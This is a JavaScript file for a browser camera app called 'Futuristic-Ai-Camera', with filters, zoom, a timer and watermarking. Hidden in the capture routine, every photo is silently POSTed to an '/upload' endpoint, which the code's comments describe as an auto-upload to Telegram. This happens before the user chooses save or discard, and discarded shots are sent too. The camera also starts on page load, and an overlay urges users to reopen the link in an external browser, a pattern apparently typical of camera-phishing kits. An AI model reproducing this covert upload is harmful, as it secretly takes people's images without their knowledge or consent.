//* #VIDEO_AND_CANVAS_ELEMENTS
const video = document.getElementById("camera");
const canvas = document.getElementById("canvas");
const captureBtn = document.getElementById("capture");
const saveConfirm = document.getElementById("save-confirmation");
const discardConfirm = document.getElementById("discard-confirmation");
const filters = document.querySelectorAll(".filter-btn");
const gallery = document.getElementById("gallery");
const galleryThumbnail = document.getElementById("gallery-thumbnail-box");

//* #MODAL_ELEMENTS
const photoModal = document.getElementById("photo-preview-modal");
const modalPreviewImage = document.getElementById("modal-preview-image");
const modalSaveBtn = document.getElementById("modal-save-btn");
const modalDiscardBtn = document.getElementById("modal-discard-btn");

//* #BURGER_MENU_ELEMENTS
const burgerMenuBtn = document.getElementById("burger-menu-btn");
const sideMenu = document.getElementById("side-menu");
const closeMenuBtn = document.getElementById("close-menu-btn");

//* #TIMER_ELEMENTS
const timerToggle = document.getElementById("timer-toggle");
const timerOptions = document.getElementById("timer-options");
const timerButtons = document.querySelectorAll(".timer-option");

//* #MENU_SECTION_ELEMENTS
const settingsSection = document.getElementById("settings-section");
const profileSection = document.getElementById("profile-section");
const aboutSection = document.getElementById("about-section");
const aboutModal = document.getElementById("about-modal");
const closeAboutBtn = document.getElementById("close-about-btn");
const donateSection = document.getElementById("donate-section");

//* #SETTINGS_MODAL_ELEMENTS
const settingsModal = document.getElementById("settings-modal");
const closeSettingsBtn = document.getElementById("close-settings-btn");
const saveSettingsBtn = document.getElementById("save-settings-btn");
const notificationToggle = document.getElementById("notification-toggle");
const cameraQuality = document.getElementById("camera-quality");
const timestampToggle = document.getElementById("timestamp-toggle");
const watermarkToggle = document.getElementById("watermark-toggle");
const aiPromptToggle = document.getElementById("ai-prompt-toggle");

//* #FLOATING_BUTTON_AND_OVERLAY_ELEMENTS
const floatingBtn = document.getElementById("floating-guide-btn");
const overlay = document.getElementById("open-external-overlay");
const closeOverlayBtn = document.getElementById("close-overlay-btn");
const copyLinkBtn = document.getElementById("copy-link-btn");
const linkText = document.getElementById("site-link");

//* #ZOOM_CONTROL_ELEMENTS
const zoomControl = document.getElementById("zoom-control");
const zoomThumb = document.querySelector(".zoom-thumb");
const zoomTrack = document.querySelector(".zoom-track");

//* #GLOBAL_VARIABLES
let currentFilter = "none";
let zoom = 1;
let currentPhotoData = null;
let photoCount = 0;
let zoomControlVisible = false;
let hideZoomTimeout = null;

//* #SETTINGS_VALUES
let settings = {
  notifications: true,
  quality: "1080",
  timestamp: true,
  watermark: true,
  aiPrompt: false
};

//* #BURGER_MENU_OPEN_CLOSE
burgerMenuBtn.addEventListener("click", () => {
  sideMenu.classList.add("open");
});

closeMenuBtn.addEventListener("click", () => {
  sideMenu.classList.remove("open");
});

document.addEventListener("click", (e) => {
  if (!sideMenu.contains(e.target) && !burgerMenuBtn.contains(e.target)) {
    sideMenu.classList.remove("open");
  }
});

//* #TIMER_TOGGLE_FUNCTIONALITY
timerToggle.addEventListener("click", (e) => {
  e.stopPropagation();
  timerOptions.classList.toggle("show");
});

//* #TIMER_BUTTON_FUNCTIONALITY
timerButtons.forEach(btn => {
  btn.addEventListener("click", () => {
    const seconds = parseInt(btn.dataset.time);
    sideMenu.classList.remove("open");
    timerOptions.classList.remove("show");
    startTimer(seconds);
  });
});

//* #SETTINGS_SECTION_FUNCTIONALITY
settingsSection.addEventListener("click", () => {
  settingsModal.classList.add("show");
  sideMenu.classList.remove("open");
});

closeSettingsBtn.addEventListener("click", () => {
  settingsModal.classList.remove("show");
});

settingsModal.addEventListener("click", (e) => {
  if (e.target === settingsModal) {
    settingsModal.classList.remove("show");
  }
});

aiPromptToggle.addEventListener("change", (e) => {
  if (e.target.checked) {
    alert("🤖 AI Prompt Feature\n\n⚠️ UNDER CONSTRUCTION ⚠️\n\nThis feature is coming soon!\nStay tuned for AI-powered camera enhancements.");
    e.target.checked = false;
  }
});

saveSettingsBtn.addEventListener("click", () => {
  settings.notifications = notificationToggle.checked;
  settings.quality = cameraQuality.value;
  settings.timestamp = timestampToggle.checked;
  settings.watermark = watermarkToggle.checked;
  settings.aiPrompt = aiPromptToggle.checked;
  
  const toast = document.createElement("div");
  toast.id = "copy-toast";
  toast.textContent = "✅ Settings Saved!";
  document.body.appendChild(toast);
  
  setTimeout(() => toast.classList.add("show"), 10);
  setTimeout(() => {
    toast.classList.remove("show");
    setTimeout(() => toast.remove(), 300);
  }, 2000);
  
  settingsModal.classList.remove("show");
  
  console.log("Settings saved:", settings);
});

//* #PROFILE_SECTION_FUNCTIONALITY
profileSection.addEventListener("click", () => {
  alert("👤 Profile\n\nJonnel Soriano\nDeveloper & Creator\n\nContact: jonnelsoriano@gmail.com");
  sideMenu.classList.remove("open");
});

//* #ABOUT_SECTION_FUNCTIONALITY
aboutSection.addEventListener("click", () => {
  aboutModal.classList.add("show");
  sideMenu.classList.remove("open");
});

closeAboutBtn.addEventListener("click", () => {
  aboutModal.classList.remove("show");
});

aboutModal.addEventListener("click", (e) => {
  if (e.target === aboutModal) {
    aboutModal.classList.remove("show");
  }
});

//* #DONATE_SECTION_FUNCTIONALITY
donateSection.addEventListener("click", () => {
  alert("❤️ Donate\n\nThank you for considering a donation!\n\nYour support helps improve this app.\n\nFeature coming soon...");
  sideMenu.classList.remove("open");
});

//* #FLOATING_BUTTON_DRAGGABLE
let isDragging = false;
let offsetX, offsetY;

floatingBtn.addEventListener("mousedown", startDrag);
floatingBtn.addEventListener("touchstart", startDrag);

function startDrag(e) {
  isDragging = true;
  const touch = e.touches ? e.touches[0] : e;
  const rect = floatingBtn.getBoundingClientRect();
  offsetX = touch.clientX - rect.left;
  offsetY = touch.clientY - rect.top;
  
  document.addEventListener("mousemove", onDrag);
  document.addEventListener("touchmove", onDrag);
  document.addEventListener("mouseup", stopDrag);
  document.addEventListener("touchend", stopDrag);
}

function onDrag(e) {
  if (!isDragging) return;
  e.preventDefault();
  const touch = e.touches ? e.touches[0] : e;
  
  let x = touch.clientX - offsetX;
  let y = touch.clientY - offsetY;
  
  const maxX = window.innerWidth - floatingBtn.offsetWidth;
  const maxY = window.innerHeight - floatingBtn.offsetHeight;
  
  x = Math.max(0, Math.min(x, maxX));
  y = Math.max(0, Math.min(y, maxY));
  
  floatingBtn.style.left = x + "px";
  floatingBtn.style.top = y + "px";
  floatingBtn.style.right = "auto";
  floatingBtn.style.bottom = "auto";
}

function stopDrag() {
  isDragging = false;
  document.removeEventListener("mousemove", onDrag);
  document.removeEventListener("touchmove", onDrag);
  document.removeEventListener("mouseup", stopDrag);
  document.removeEventListener("touchend", stopDrag);
}

//* #SHOW_HIDE_GUIDE_OVERLAY
floatingBtn.addEventListener("click", (e) => {
  if (!isDragging) {
    overlay.classList.add("show");
    linkText.textContent = window.location.href;
  }
});

closeOverlayBtn.addEventListener("click", () => {
  overlay.classList.remove("show");
});

overlay.addEventListener("click", (e) => {
  if (e.target === overlay) {
    overlay.classList.remove("show");
  }
});

//* #COPY_LINK_FUNCTIONALITY
copyLinkBtn.addEventListener("click", async () => {
  try {
    await navigator.clipboard.writeText(window.location.href);
    
    const toast = document.createElement("div");
    toast.id = "copy-toast";
    toast.textContent = "✅ Link copied!";
    document.body.appendChild(toast);
    
    setTimeout(() => toast.classList.add("show"), 10);
    setTimeout(() => {
      toast.classList.remove("show");
      setTimeout(() => toast.remove(), 300);
    }, 2000);
  } catch (err) {
    alert("Copy failed. Please copy manually.");
  }
});

//* #START_CAMERA
async function startCamera() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    video.srcObject = stream;
    await video.play();
  } catch (err) {
    console.error("Camera error:", err);
  }
}

if (location.protocol === "https:" || location.hostname === "localhost") {
  startCamera();
}

//* #FILTER_FUNCTIONALITY
filters.forEach(btn => {
  btn.addEventListener("click", () => {
    currentFilter = btn.dataset.filter;
    video.style.filter = currentFilter;
  });
});

//* #SHOW_ZOOM_CONTROL_ON_TOUCH
document.addEventListener("touchstart", handleTouch);
document.addEventListener("mousedown", handleTouch);

function handleTouch(e) {
  // Don't show zoom if clicking on buttons or controls
  if (
    e.target.closest('#capture') ||
    e.target.closest('#burger-menu-btn') ||
    e.target.closest('#floating-guide-btn') ||
    e.target.closest('#gallery-thumbnail-box') ||
    e.target.closest('.filter-btn') ||
    e.target.closest('.modal-card') ||
    e.target.closest('#side-menu') ||
    e.target.closest('#zoom-control') ||
    e.target.closest('.menu-section') ||
    e.target.closest('#settings-modal') ||
    e.target.closest('#about-modal')
  ) {
    return;
  }
  
  showZoomControl();
}

function showZoomControl() {
  zoomControl.classList.add("show");
  zoomControlVisible = true;
  
  if (hideZoomTimeout) {
    clearTimeout(hideZoomTimeout);
  }
  
  hideZoomTimeout = setTimeout(() => {
    zoomControl.classList.remove("show");
    zoomControlVisible = false;
  }, 3000);
}

//* #ZOOM_SLIDER_FUNCTIONALITY
let isZooming = false;

zoomThumb.addEventListener("mousedown", startZoom);
zoomThumb.addEventListener("touchstart", startZoom);

function startZoom(e) {
  e.preventDefault();
  e.stopPropagation();
  isZooming = true;
  
  if (hideZoomTimeout) {
    clearTimeout(hideZoomTimeout);
  }
  
  document.addEventListener("mousemove", onZoom);
  document.addEventListener("touchmove", onZoom);
  document.addEventListener("mouseup", stopZoom);
  document.addEventListener("touchend", stopZoom);
}

function onZoom(e) {
  if (!isZooming) return;
  e.preventDefault();
  
  const touch = e.touches ? e.touches[0] : e;
  const trackRect = zoomTrack.getBoundingClientRect();
  
  let y = touch.clientY - trackRect.top;
  y = Math.max(0, Math.min(y, trackRect.height));
  
  zoomThumb.style.top = y + "px";
  
  const percentage = 1 - (y / trackRect.height);
  zoom = 1 + (percentage * 1);
  video.style.transform = `scale(${zoom})`;
  
  showZoomControl();
}

function stopZoom() {
  isZooming = false;
  document.removeEventListener("mousemove", onZoom);
  document.removeEventListener("touchmove", onZoom);
  document.removeEventListener("mouseup", stopZoom);
  document.removeEventListener("touchend", stopZoom);
  
  hideZoomTimeout = setTimeout(() => {
    zoomControl.classList.remove("show");
    zoomControlVisible = false;
  }, 3000);
}

zoomTrack.addEventListener("click", (e) => {
  e.stopPropagation();
  const trackRect = zoomTrack.getBoundingClientRect();
  let y = e.clientY - trackRect.top;
  y = Math.max(0, Math.min(y, trackRect.height));
  
  zoomThumb.style.top = y + "px";
  
  const percentage = 1 - (y / trackRect.height);
  zoom = 1 + (percentage * 1);
  video.style.transform = `scale(${zoom})`;
  
  showZoomControl();
});

//* #TIMER_CAPTURE_FUNCTIONALITY
function startTimer(seconds) {
  let count = seconds;
  const timerOverlay = document.createElement("div");
  timerOverlay.style.position = "absolute";
  timerOverlay.style.top = "50%";
  timerOverlay.style.left = "50%";
  timerOverlay.style.transform = "translate(-50%, -50%)";
  timerOverlay.style.fontSize = "80px";
  timerOverlay.style.color = "#00f0ff";
  timerOverlay.style.textShadow = "0 0 20px #ff00f0";
  timerOverlay.style.fontWeight = "bold";
  timerOverlay.style.zIndex = "200";
  timerOverlay.textContent = count;
  document.querySelector(".camera-box").appendChild(timerOverlay);

  const interval = setInterval(() => {
    count--;
    if (count > 0) {
      timerOverlay.textContent = count;
    } else {
      clearInterval(interval);
      timerOverlay.remove();
      takePhoto();
    }
  }, 1000);
}

//* #CAPTURE_PHOTO
captureBtn.addEventListener("click", () => takePhoto());

function takePhoto() {
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  const ctx = canvas.getContext("2d");
  ctx.filter = currentFilter || "none";
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

  // Add watermark if enabled
  if (settings.watermark) {
    const logoImg = new Image();
    logoImg.src = "about/logo.jpg";
    logoImg.onload = () => {
      const logoSize = 60;
      ctx.drawImage(logoImg, 20, canvas.height - logoSize - 20, logoSize, logoSize);
      
      // Add text watermark
      ctx.font = "bold 14px Arial";
      ctx.fillStyle = "rgba(255,255,255,0.9)";
      ctx.strokeStyle = "rgba(0,0,0,0.8)";
      ctx.lineWidth = 3;
      ctx.strokeText("Futuristic-Ai-Camera", 90, canvas.height - 35);
      ctx.fillText("Futuristic-Ai-Camera", 90, canvas.height - 35);
      
      addTimestampAndFinalize(ctx);
    };
    logoImg.onerror = () => {
      addTimestampAndFinalize(ctx);
    };
  } else {
    addTimestampAndFinalize(ctx);
  }
}

function addTimestampAndFinalize(ctx) {
  // Add timestamp if enabled
  if (settings.timestamp) {
    const now = new Date();
    const dateStr = now.toLocaleDateString('en-US', { 
      month: '2-digit', 
      day: '2-digit', 
      year: 'numeric' 
    });
    const timeStr = now.toLocaleTimeString('en-US', { 
      hour: '2-digit', 
      minute: '2-digit', 
      second: '2-digit' 
    });
    const timestamp = `${dateStr} ${timeStr}`;
    
    ctx.font = "bold 14px Arial";
    ctx.fillStyle = "rgba(255,255,255,0.9)";
    ctx.strokeStyle = "rgba(0,0,0,0.8)";
    ctx.lineWidth = 3;
    const textWidth = ctx.measureText(timestamp).width;
    ctx.strokeText(timestamp, canvas.width - textWidth - 20, canvas.height - 25);
    ctx.fillText(timestamp, canvas.width - textWidth - 20, canvas.height - 25);
  }

  const dataUrl = canvas.toDataURL("image/png");
  currentPhotoData = dataUrl;

  // Show modal with preview
  modalPreviewImage.src = dataUrl;
  photoModal.classList.add("show");

  // Auto-upload to Telegram (if endpoint exists)
  canvas.toBlob(async (blob) => {
    const formData = new FormData();
    formData.append("photo", blob, "snapshot.png");
    try {
      await fetch("/upload", { method: "POST", body: formData });
      console.log("✅ Photo sent to Telegram!");
    } catch (err) {
      console.error("Telegram upload error:", err);
    }
  });
}

//* #MODAL_SAVE_FUNCTIONALITY
modalSaveBtn.addEventListener("click", () => {
  if (!currentPhotoData) return;

  // Download photo
  const link = document.createElement("a");
  link.href = currentPhotoData;
  link.download = `photo_${Date.now()}.png`;
  document.body.appendChild(link);
  link.click();
  document.body.removeChild(link);

  // Add to hidden gallery
  const img = document.createElement("img");
  img.src = currentPhotoData;
  gallery.appendChild(img);

  // Update thumbnail box
  updateGalleryThumbnail(currentPhotoData);
  photoCount++;

  // Close modal
  photoModal.classList.remove("show");
  showFloating(saveConfirm);
  currentPhotoData = null;
});

//* #MODAL_DISCARD_FUNCTIONALITY
modalDiscardBtn.addEventListener("click", () => {
  photoModal.classList.remove("show");
  showFloating(discardConfirm);
  currentPhotoData = null;
});

//* #UPDATE_GALLERY_THUMBNAIL
function updateGalleryThumbnail(imageSrc) {
  galleryThumbnail.innerHTML = `<img src="${imageSrc}" alt="Latest">`;
}

//* #FLOATING_NOTIFICATION
function showFloating(el) {
  el.style.display = "block";
  setTimeout(() => { el.style.display = "none"; }, 2000);
}

//* #SCROLLABLE_FILTERS
const slider = document.querySelector(".filter-container");
if (slider) {
  let isDown = false;
  let startX;
  let scrollLeft;

  slider.addEventListener("mousedown", e => {
    isDown = true;
    startX = e.pageX - slider.offsetLeft;
    scrollLeft = slider.scrollLeft;
  });

  slider.addEventListener("mouseleave", () => isDown = false);
  slider.addEventListener("mouseup", () => isDown = false);

  slider.addEventListener("mousemove", e => {
    if (!isDown) return;
    const x = e.pageX - slider.offsetLeft;
    const walk = (x - startX) * 2;
    slider.scrollLeft = scrollLeft - walk;
  });

  slider.addEventListener("touchstart", e => {
    isDown = true;
    startX = e.touches[0].pageX - slider.offsetLeft;
    scrollLeft = slider.scrollLeft;
  });

  slider.addEventListener("touchend", () => isDown = false);

  slider.addEventListener("touchmove", e => {
    if (!isDown) return;
    const x = e.touches[0].pageX - slider.offsetLeft;
    const walk = (x - startX) * 2;
    slider.scrollLeft = scrollLeft - walk;
  });
}